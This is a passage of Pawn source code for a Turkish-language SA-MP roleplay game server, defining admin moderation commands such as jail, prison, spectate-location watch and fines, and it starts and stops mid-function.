                			new File: file = fopen(sstring, io_read);
                    		if(file)
							{
                    	    fread(file, strFromFile);
                        	fclose(file);
                        	rtoken = strval(strFromFile);
                    		}
                		}

                        format(string, sizeof(string), "(Level %d Admin: %s) - (Ýþbaþýnda) - (Bugünkü Raporlar: %d)", PlayerInfo[i][pAdmin], GetPlayerNameEx(i), rtoken);
					}
					else
					{
   						format(sstring,sizeof(sstring),"admins/rtokens/%s[%d'%d'%d]",PlayerInfo[i][pAdminName],month,day,year);
                		if(fexist(sstring))
						{
                			new File: file = fopen(sstring, io_read);
                    		if(file)
							{
                    	    fread(file, strFromFile);
                        	fclose(file);
                        	rtoken = strval(strFromFile);
                    		}
                		}

   						if(strlen(PlayerInfo[i][pAdminName]) > 2 && strlen(PlayerInfo[i][pAdminName]) < 20)
						{
							format(string, sizeof(string), "(Level %d Admin: %s) - (Ýþbaþýnda deðil) - (ID %d - %s) - (Bugünkü Raporlar: %d)", PlayerInfo[i][pAdmin], PlayerInfo[i][pAdminName], i, GetPlayerNameEx(i), rtoken);
						}
						else
						{
							format(string, sizeof(string), "(Level %d Admin: Admin ismi ayarlanmamýþ) - (Ýþbaþýnda deðil) - (ID %d - %s) - (Bugünkü Raporlar: %d)", PlayerInfo[i][pAdmin], i, GetPlayerNameEx(i), rtoken);
						}
					}
                }
                else
				{
					if(AdminDuty[i] == 1)
					{
						format(string, sizeof(string), "(Level %d Admin: %s) - (Ýþbaþýnda)", PlayerInfo[i][pAdmin], GetPlayerNameEx(i));
					}
					else
					{
 						if(strlen(PlayerInfo[i][pAdminName]) > 2 && strlen(PlayerInfo[i][pAdminName]) < 20)
						{
							format(string, sizeof(string), "(Level %d Admin: %s) - (Ýþbaþýnda deðil) - (ID %d - %s)", PlayerInfo[i][pAdmin], PlayerInfo[i][pAdminName], i, GetPlayerNameEx(i));
						}
						else
						{
							format(string, sizeof(string), "(Level %d Admin: Admin ismi ayarlanmamýþ) - (Ýþbaþýnda deðil) - (ID %d - %s)", PlayerInfo[i][pAdmin], i, GetPlayerNameEx(i));
						}
					}
                }

                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Oyunla veya sunucuyla ilgili bir sorun varsa, /newb kullan.");
        SendClientMessage(playerid, COLOR_GRAD1, "Þüpheli olaylar/oyuncular görüyorsan /rapor [id] [sebep].");
    }
    return 1;
}

CMD:jail(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			iTargetID,
			szReason[64];

		if(sscanf(params, "us[64]", iTargetID, szReason)) {
			SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /jail [Oyuncu ID/Ýsim] [sebep]");
		}
		else if(IsPlayerConnected(iTargetID)) {
			if(AdminDuty[iTargetID] == 1) {
				return SendClientMessage(playerid, COLOR_WHITE, "Ýþbaþýndaki adminler üzerinde bunu deneyemezsin.");
			}
			if(PlayerInfo[iTargetID][pAdmin] >= PlayerInfo[playerid][pAdmin]) {
				return SendClientMessage(playerid, COLOR_WHITE, "Ayný veya daha yüksek seviye adminler üzerinde bunu deneyemezsin.");
			}

			//if(GetPVarInt(iTargetID, "PBM") > 0) LeavePaintballArena(iTargetID, GetPVarInt(iTargetID, "IsInArena"));

			new
				szMessage[128];

			ResetPlayerWeaponsEx(iTargetID);
			if(PlayerDraggedBy[iTargetID] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[iTargetID]] = INVALID_PLAYER_ID;
				PlayerDragged[iTargetID] = 0;
				PlayerDraggedBy[iTargetID] = INVALID_PLAYER_ID;
			}
			if(IsPlayerAttachedObjectSlotUsed(iTargetID, 0))
				RemovePlayerAttachedObject(iTargetID, 0);
			PlayerInfo[iTargetID][pJailed] = 3;
			PhoneOnline[iTargetID] = 1;
			PlayerInfo[iTargetID][pJailTime] = 20*60;

		    LoadObjectsForPlayer(iTargetID);

			SetPlayerInterior(iTargetID, 69);
			PlayerInfo[iTargetID][pVW] = 696969;
			PlayerInfo[iTargetID][pInt] = 69;
			SetPlayerVirtualWorld(iTargetID, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(iTargetID, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			format(szMessage, sizeof(szMessage), "AdminKomutu: %s, %s tarafýndan hapse gönderildi, sebep: %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid), szReason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, szMessage);

			format(szMessage, sizeof(szMessage), "AdminKomutu: %s, %s tarafýndan hapse gönderildi, sebep: %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid), szReason);
			Log("logs/admin.log", szMessage);

			format(szMessage, sizeof(szMessage), "Admin %s tarafýndan 20 dakika hapse gönderildin, sebep: %s.", GetPlayerNameEx(playerid), szReason);
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			format(szMessage, sizeof(szMessage), "%s", szReason);
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			strcpy(PlayerInfo[iTargetID][pPrisonedBy], GetPlayerNameEx(playerid), MAX_PLAYER_NAME);
			strcpy(PlayerInfo[iTargetID][pPrisonReason], szReason, 128);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		}
	}
	return 1;
}

CMD:hjail(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] >= 6)
	{
		new
			iTargetID,
			szReason[64];

		if(sscanf(params, "us[64]", iTargetID, szReason)) {
			SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /hjail [Oyuncu ID/Ýsim] [sebep]");
		}
		else if(IsPlayerConnected(iTargetID)) {
			if(AdminDuty[iTargetID] == 1) {
				return SendClientMessage(playerid, COLOR_WHITE, "Ýþbaþýndaki adminler üzerinde bunu deneyemezsin.");
			}
			new
				szMessage[128];

			ResetPlayerWeaponsEx(iTargetID);
			if(PlayerDraggedBy[iTargetID] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[iTargetID]] = INVALID_PLAYER_ID;
				PlayerDragged[iTargetID] = 0;
				PlayerDraggedBy[iTargetID] = INVALID_PLAYER_ID;
			}
			if(IsPlayerAttachedObjectSlotUsed(iTargetID, 0))
				RemovePlayerAttachedObject(iTargetID, 0);
			PlayerInfo[iTargetID][pJailed] = 3;
			PhoneOnline[iTargetID] = 1;
			PlayerInfo[iTargetID][pJailTime] = 20*60;

		    LoadObjectsForPlayer(iTargetID);

			SetPlayerInterior(iTargetID, 69);
			PlayerInfo[iTargetID][pVW] = 696969;
			PlayerInfo[iTargetID][pInt] = 69;
			SetPlayerVirtualWorld(iTargetID, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(iTargetID, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			format(szMessage, sizeof(szMessage), "HelperKomutu: %s, %s tarafýndan hapse gönderildi, sebep: %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid), szReason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, szMessage);

			format(szMessage, sizeof(szMessage), "HelperKomutu: %s, %s tarafýndan hapse gönderildi, sebep: %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid), szReason);
			Log("logs/admin.log", szMessage);

			format(szMessage, sizeof(szMessage), "Helper %s tarafýndan 20 dakika hapse gönderildin, sebep: %s.", GetPlayerNameEx(playerid), szReason);
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			format(szMessage, sizeof(szMessage), "%s", szReason);
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			strcpy(PlayerInfo[iTargetID][pPrisonedBy], GetPlayerNameEx(playerid), MAX_PLAYER_NAME);
			strcpy(PlayerInfo[iTargetID][pPrisonReason], szReason, 128);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		}
	}
	return 1;
}

CMD:gotoplayerscar(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

        new
			iTargetID;

        if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotoplayerscar [Oyuncu ID/Ýsim]");
		}
		else if(IsPlayerConnected(iTargetID)) {

			new
				szVehString[1024];

			for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
				if((iModelID = PlayerVehicleInfo[iTargetID][i][pvModelId] - 400) >= 0) {
					if(PlayerVehicleInfo[iTargetID][i][pvImpounded]) {
						format(szVehString, sizeof(szVehString), "%s\n%s (El koyulmuþ)", szVehString, VehicleName[iModelID]);
					}
					else if(PlayerVehicleInfo[iTargetID][i][pvDisabled]) {
						format(szVehString, sizeof(szVehString), "%s\n%s (Geçersiz)", szVehString, VehicleName[iModelID]);
					}
					else if(!PlayerVehicleInfo[iTargetID][i][pvSpawned]) {
						format(szVehString, sizeof(szVehString), "%s\n%s (Saklanmýþ)", szVehString, VehicleName[iModelID]);
					}
					else format(szVehString, sizeof(szVehString), "%s\n%s (ID %i)", szVehString, VehicleName[iModelID], PlayerVehicleInfo[iTargetID][i][pvId]);
				}
				else strcat(szVehString, "\nYok");
			}
		    ShowPlayerDialogEx(playerid, GOTOPLAYERCAR, DIALOG_STYLE_LIST, "Araç Iþýnlama", szVehString, "Iþýnla", "Iptal");
       		SetPVarInt(playerid, "playeraffectedcarTP", iTargetID);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		{

		}
  	}
	return 1;
}

CMD:watch(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkin yok.");
		return 1;
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Izlerken bunu yapamazsýn.");
		return 1;
	}
 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  	{
   		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

	if(isnull(params))
	{
	    // VIP gold room needs to be fixed
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /watch [location] (or /watch off)");
		SendClientMessage(playerid, COLOR_GRAD2, "Genel Yerler: gym, lspd, allsaints, countygen, grove, tgb, bank, motel, cityhall, mall");
        SendClientMessage(playerid, COLOR_GRAD2, "Nokta Yerler: mp1, df, mf1, dh, mp2, cl, mf2, aec, ffc");
	}
	// GENERAL LOCATIONS
	if(strcmp(params, "gym", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Ganton gym'i izliyorsun.");
		SetPlayerPos(playerid, 2212.61, -1730.57, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2208.67, -1733.71, 27.48);
		SetPlayerCameraLookAt(playerid, 2225.25, -1723.1, 13.56);
	}
	else if(strcmp(params, "lspd", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "LSPD'yi izliyorsun.");
		SetPlayerPos(playerid, 1504.23, -1700.17, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1500.21, -1691.75, 38.38);
		SetPlayerCameraLookAt(playerid, 1541.46, -1676.17, 13.55);
	}
	else if(strcmp(params, "allsaints", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "All Saints Hastanesini izliyorsun.");
		SetPlayerPos(playerid, 1201.12, -1324, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1207.39, -1294.71, 24.61);
		SetPlayerCameraLookAt(playerid, 1181.72, -1322.65, 13.58);
	}
	else if(strcmp(params, "countygen", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "County General Hastanesini izliyorsun.");
		SetPlayerPos(playerid, 1989.24, -1461.38, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1981.79, -1461.55, 31.93);
		SetPlayerCameraLookAt(playerid, 2021.23, -1427.48, 13.97);
	}
	else if(strcmp(params, "grove", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Grove Street'i izliyorsun.");
		SetPlayerPos(playerid, 2489.09, -1669.88, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2459.82, -1652.68, 26.45);
		SetPlayerCameraLookAt(playerid, 2489.09, -1669.88, 13.34);
	}
	else if(strcmp(params, "tgb", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Ten Green Bottles'ý izliyorsun.");
		SetPlayerPos(playerid, 2319.09, -1650.90, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2336.31, -1664.76, 24.98);
		SetPlayerCameraLookAt(playerid, 2319.09, -1650.90, 14.16);
	}
	else if(strcmp(params, "bank", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Los Santos Bankasýný izliyorsun.");
		SetPlayerPos(playerid, 1466.24, -1023.05, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1502.28, -1044.47, 31.19);
		SetPlayerCameraLookAt(playerid, 1466.24, -1023.05, 23.83);
	}
	else if(strcmp(params, "motel", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Jefferson Motelini izliyorsun.");
		SetPlayerPos(playerid, 2215.73, -1163.39, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2203.05, -1152.81, 37.03);
		SetPlayerCameraLookAt(playerid, 2215.73, -1163.39, 25.73);
	}
	else if(strcmp(params, "cityhall", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Los Santos City Hall'ý izliyorsun.");
		SetPlayerPos(playerid, 1478.936035, -1746.446655, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1447.461669, -1717.788085, 44.047473);
		SetPlayerCameraLookAt(playerid, 1478.936035, -1746.446655, 14.347633);
	}
	else if(strcmp(params, "mall", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Los Santos Mall'ý izliyorsun.");
		SetPlayerPos(playerid, 1127.245483, -1451.613891, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1092.614868, -1499.197998, 42.018226);
		SetPlayerCameraLookAt(playerid, 1127.245483, -1451.613891, 15.796875);
	}

	// Points (mp1, df, mf1, dh, mp2, cl, mf2, aec, ffc)
	else if(strcmp(params, "mp1", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Materyal Pickup 1'i izliyorsun.");
  		SetPlayerPos(playerid, 1423.773437, -1320.386962, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1411.689941, -1352.002929, 24.477527);
		SetPlayerCameraLookAt(playerid, 1423.773437, -1320.386962, 13.554687);
	}
	else if(strcmp(params, "df", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Drug Factory'i izliyorsun.");
  		SetPlayerPos(playerid, 2205.938964, 1582.210449, 987.316528);
		SetPlayerInterior(playerid, 1);
		PlayerInfo[playerid][pInt] = 1;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2222.844482, 1590.667968, 1002.612915);
		SetPlayerCameraLookAt(playerid, 2206.402587, 1582.398681, 999.976562);
	}
	else if(strcmp(params, "mf1", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Materyal Factory 1'i izliyorsun.");
  		SetPlayerPos(playerid, 2172.315185, -2263.781250, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2206.363769, -2262.568359, 24.240808);
		SetPlayerCameraLookAt(playerid, 2172.315185, -2263.781250, 13.335824);
	}
	else if(strcmp(params, "dh", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Drug House'u izliyorsun.");
  		SetPlayerPos(playerid, 323.577026, 1118.344116, 1063.765625);
		SetPlayerInterior(playerid, 5);
		PlayerInfo[playerid][pInt] = 5;
		SetPlayerVirtualWorld(playerid, 20019);
		PlayerInfo[playerid][pVW] = 20019;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 316.387817, 1123.946289, 1085.046020);
		SetPlayerCameraLookAt(playerid, 323.577026, 1118.344116, 1083.882812);
	}
	else if(strcmp(params, "mp2", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Materyal Pickup 2'yi izliyorsun.");
  		SetPlayerPos(playerid, 2390.212402, -2008.328491, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2410.285644, -2013.919433, 21.716161);
		SetPlayerCameraLookAt(playerid, 2390.212402, -2008.328491, 13.553703);
	}
	else if(strcmp(params, "cl", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Crack Lab'ý izliyorsun.");
  		SetPlayerPos(playerid, 2346.013916, -1185.367065, 977.425842);
		SetPlayerInterior(playerid, 5);
		PlayerInfo[playerid][pInt] = 5;
		SetPlayerVirtualWorld(playerid, 20020);
		PlayerInfo[playerid][pVW] = 20020;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2342.012207, -1180.969848, 1029.412353);
		SetPlayerCameraLookAt(playerid, 2346.013916, -1185.367065, 1027.976562);
	}
	else if(strcmp(params, "mf2", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Materyal Factory 2'yi izliyorsun.");
  		SetPlayerPos(playerid, 2282.298828, -1110.143798, -35.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2306.088623, -1133.968627, 52.929584);
		SetPlayerCameraLookAt(playerid, 2282.298828, -1110.143798, 37.976562);
	}
	else if(strcmp(params, "aec", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Auto Export Company'i izliyorsun.");
  		SetPlayerPos(playerid,2729.929687, -2451.353271, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2780.443847, -2383.833984, 31.127187);
		SetPlayerCameraLookAt(playerid, 2729.929687, -2451.353271, 17.593746);
	}
	else if(strcmp(params, "ffc", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Fossil Fuel Company'i izliyorsun.");
  		SetPlayerPos(playerid, 2662.808105, -2133.713623, -39.590702);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2662.808105, -2133.713623, 26.140636);
		SetPlayerCameraLookAt(playerid, 2636.352294, -2109.808349, 13.546875);
	}


	// OFF
	else if(strcmp(params, "off", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Hiçbir bölgeyi izlemiyorsun.");
		SetPlayerPos(playerid, 1520.50, -1674.70, 13.55);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		SetPlayerFacingAngle(playerid, 270.0);
		SetCameraBehindPlayer(playerid);
		TogglePlayerControllable(playerid,1);
	}
	return 1;
}

CMD:prisoners(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
 	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
   		}

  		new
  		    string[128];

		SendClientMessage(playerid, COLOR_WHITE, "----------------------------------------");

		foreach(Player, i) {
    		if(PlayerInfo[i][pJailed] >= 1 && PlayerInfo[i][pJailTime] >= 1) {
        		if(strlen(PlayerInfo[i][pPrisonReason]) >= 1 && strlen(PlayerInfo[i][pPrisonedBy]) >= 1) {
					format(string, sizeof(string), "%s (Kim tarafýndan: %s), sebep: %s (%d dakika)", GetPlayerNameEx(i), PlayerInfo[i][pPrisonedBy], PlayerInfo[i][pPrisonReason], PlayerInfo[i][pJailTime]/60);
	                SendClientMessage(playerid, COLOR_GREY, string);
      			}
         		else
           		{
            		format(string, sizeof(string), "%s (Kim tarafýndan: bilinmiyor), sebep: bilinmiyor (%d dakika)", GetPlayerNameEx(i), PlayerInfo[i][pJailTime]/60);
             		SendClientMessage(playerid, COLOR_GREY, string);
             	}
      		}
      	}

      	SendClientMessage(playerid, COLOR_WHITE, "----------------------------------------");
	}
	return 1;
}

CMD:prison(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			giveplayerid,
			minutes,
			reason[64];

		if(sscanf(params, "uds[64]", giveplayerid, minutes, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /prison [Oyuncu ID/Ýsim] [dakika] [sebep]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
				return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu sana eþit veya daha yüksek leveldeki admin  üzerinde uygulayamazsýn.");

			SetPlayerArmedWeapon(giveplayerid, 0);

			GameTextForPlayer(giveplayerid, "~w~Hoþgeldiniz to ~n~~r~Admin Hapishanesi", 5000, 3);

			ResetPlayerWeaponsEx(giveplayerid);
			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan hapse gönderildi, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan hapse gönderildi, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			punishmentLog(giveplayerid, playerid, 2, string, reason);
			if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
				PlayerDragged[giveplayerid] = 0;
				PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
			}
			PlayerInfo[giveplayerid][pWantedLevel] = 0;
			SetPlayerWantedLevel(giveplayerid, 0);
			PlayerInfo[giveplayerid][pJailed] = 3;
			PlayerInfo[giveplayerid][pJailTime] = minutes*60;

			if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
				RemovePlayerAttachedObject(giveplayerid, 0);

			format(PlayerInfo[giveplayerid][pPrisonReason], 128, "%s", reason);
			format(PlayerInfo[giveplayerid][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));
			PhoneOnline[giveplayerid] = 1;

		    LoadObjectsForPlayer(giveplayerid);

			SetPlayerInterior(giveplayerid, 69);
			PlayerInfo[giveplayerid][pVW] = 696969;
			PlayerInfo[giveplayerid][pInt] = 69;
			SetPlayerVirtualWorld(giveplayerid, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(giveplayerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			SetPlayerSkin(giveplayerid, 50);
			SetPlayerColor(giveplayerid, TEAM_APRISON_COLOR);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:oprison(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			name[MAX_PLAYER_NAME],
			minutes,
			reason[64];

		if(sscanf(params, "s[24]ds[64]", name, minutes, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /oprison [oyuncuadý] [zaman (dakika)] [sebep]");

        new giveplayerid = ReturnUser(name);
        if(IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu online, /prison komutunu online oyuncular için kullan.");

		SetPVarInt(playerid, "oprisontime", minutes*60);
		SetPVarString(playerid, "oprisonreason", reason);

		new
		    szPlayerName[MAX_PLAYER_NAME];

		mysql_real_escape_string(name, szPlayerName, g_MySQLConnections[0]);

		format(string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, JailTime, ID FROM players WHERE Username = '%s'", szPlayerName);
		mysql_query(string, THREAD_OFFLINE_PRISON, playerid, g_MySQLConnections[0]);
	}
	return 1;
}

CMD:fine(playerid, params[])
{
	new string[128], giveplayerid, amount, reason[64];
	if(sscanf(params, "uds", giveplayerid, amount, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /fine [Oyuncu ID/Ýsim] [amount] [sebep]");

	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(IsPlayerConnected(giveplayerid))
		{
			if(amount < 1)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Miktar 0'dan büyük olmalý.");
				return 1;
			}
			format(string, sizeof(string), "AdminKomutu: %s tarafýndan $%d para cezasýna çarptýrýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), amount, reason);
			Log("logs/admin.log", string);
			punishmentLog(giveplayerid, playerid, 3, string, reason);

			format(string, sizeof(string), "AdminKomutu: %s tarafýndan $%d para cezasýna çarptýrýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), amount, reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			GivePlayerCash(giveplayerid, -amount);
			return 1;
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Level 3 Admin deðilsin.");
	}
	return 1;
}

CMD:pfine(playerid, params[])
{
	new string[128], giveplayerid, percentage, reason[64];
